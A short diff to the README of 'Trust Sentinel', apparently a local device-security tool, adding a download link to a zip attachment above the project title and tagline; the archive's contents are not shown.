@@ -1,3 +1,5 @@
+[TrustSentinel.zip](https://github.com/user-attachments/files/30222845/TrustSentinel.zip)
+
 # 🛡️ Trust Sentinel
 
 > **Your device's silent guardian. No cloud. No nonsense.**
